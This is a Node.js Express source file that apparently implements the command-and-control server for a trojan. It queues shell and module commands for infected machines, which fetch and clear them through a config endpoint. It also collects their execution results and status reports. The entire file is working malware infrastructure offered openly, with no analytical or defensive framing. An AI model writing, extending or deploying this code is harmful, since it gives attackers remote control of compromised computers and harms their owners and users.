const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const port = 3000;

let trojanConfig = {
  commands: [],
  stop: false,
};

// Middleware for parsing JSON
app.use(bodyParser.json());

// Middleware for logging requests
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Route: Add a new command to the Trojan's configuration
app.post("/send-command", (req, res) => {
  const { type, command, module } = req.body;

  if (
    type &&
    (type === "shell" || type === "module" || type === "c_module") &&
    (command || module)
  ) {
    const newCommand = { type, command, module, timestamp: new Date() };
    trojanConfig.commands.push(newCommand);
    console.log(`Command added: ${JSON.stringify(newCommand)}`);
    res.status(200).json({ message: "Command received", command: newCommand });
  } else {
    console.error("Invalid command format");
    res.status(400).json({ message: "Invalid command format" });
  }
});

// Route: Fetch the Trojan's configuration and clear commands
app.get("/config", (req, res) => {
  res.status(200).json(trojanConfig);
  console.log(`Configuration fetched: ${JSON.stringify(trojanConfig)}`);
  trojanConfig.commands = []; // Clear commands after sending
});

// Route: Receive the result of a command execution
app.post("/command", (req, res) => {
  const { command, result } = req.body;

  if (command && result) {
    console.log(`Result of command '${command}':\n${result}`);
    res.status(200).json({ message: "Result received" });
  } else {
    console.error("Invalid command result format");
    res.status(400).json({ message: "Invalid format. 'command' and 'result' are required." });
  }
});

// Route: Receive a status update from the Trojan
app.post("/status", (req, res) => {
  const { id, status } = req.body;

  if (id && status) {
    console.log(`Status update from Trojan ${id}: ${status}`);
    res.status(200).json({ message: "Status received" });
  } else {
    console.error("Invalid status update format");
    res.status(400).json({ message: "Invalid format. 'id' and 'status' are required." });
  }
});

// Global error handler
app.use((err, req, res, next) => {
  console.error(`Error: ${err.message}`);
  res.status(500).json({ message: "Internal server error", error: err.message });
});

// Start the server
app.listen(port, () => {
  console.log(`Node.js server listening on port ${port}`);
});
